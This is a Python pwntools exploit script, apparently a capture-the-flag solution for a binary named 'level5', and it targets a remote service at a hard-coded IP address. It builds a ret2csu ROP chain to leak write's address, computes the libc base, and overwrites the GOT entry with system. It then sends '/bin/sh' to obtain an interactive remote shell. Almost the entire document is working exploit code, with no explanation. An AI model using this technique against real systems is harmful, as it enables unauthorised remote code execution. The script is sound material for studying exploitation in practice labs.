from pwn import *
import time

#context.log_level = 'debug'
#io = process('./level5')
io = remote('218.2.197.235', 20533)
#io = remote('218.2.197.235', 26333)
e = ELF('./level5')
#libc = e.libc
libc = ELF('./libc-2.19.so')

'''
.text:0000000000400690 loc_400690:                             ; CODE XREF: __libc_csu_init+54j
.text:0000000000400690                 mov     rdx, r13
.text:0000000000400693                 mov     rsi, r14
.text:0000000000400696                 mov     edi, r15d
.text:0000000000400699                 call    qword ptr [r12+rbx*8]
.text:000000000040069D                 add     rbx, 1
.text:00000000004006A1                 cmp     rbx, rbp
.text:00000000004006A4                 jnz     short loc_400690
.text:00000000004006A6
.text:00000000004006A6 loc_4006A6:                             ; CODE XREF: __libc_csu_init+36j
.text:00000000004006A6                 add     rsp, 8
.text:00000000004006AA                 pop     rbx
.text:00000000004006AB                 pop     rbp
.text:00000000004006AC                 pop     r12
.text:00000000004006AE                 pop     r13
.text:00000000004006B0                 pop     r14
.text:00000000004006B2                 pop     r15
.text:00000000004006B4                 ret
'''

pop_rdi = 0x00000000004006b3 #: pop rdi ; ret
pop_rsi = 0x00000000004006b1 #: pop rsi ; pop r15 ; ret

payload = 0x88 * 'A'
payload += p64(0x4006AA) + p64(0) + p64(1) + p64(e.got['write']) + p64(0x8) + p64(e.got['write']) + p64(0x1)
payload += p64(0x400690) + 'A'*8*7

payload += p64(pop_rdi) + p64(0x0) 
payload += p64(pop_rsi) + p64(e.bss(0x20)) + p64(0xdead)
payload += p64(e.plt['read'])

payload += p64(pop_rsi) + p64(e.got['write']) + p64(0xdead)
payload += p64(e.plt['read'])

payload += p64(pop_rdi) + p64(e.bss(0x20))
payload += p64(e.plt['write']) 
io.recv()
io.send(payload)
#gdb.attach(io)
buf = io.recv(8)
write_addr = u64(buf)
log.success('write = %#x' % write_addr)
libc_base = write_addr - libc.symbols['write']
system_addr = libc_base + libc.symbols['system']

io.send('/bin/sh\x00')
io.send(p64(system_addr))

io.interactive()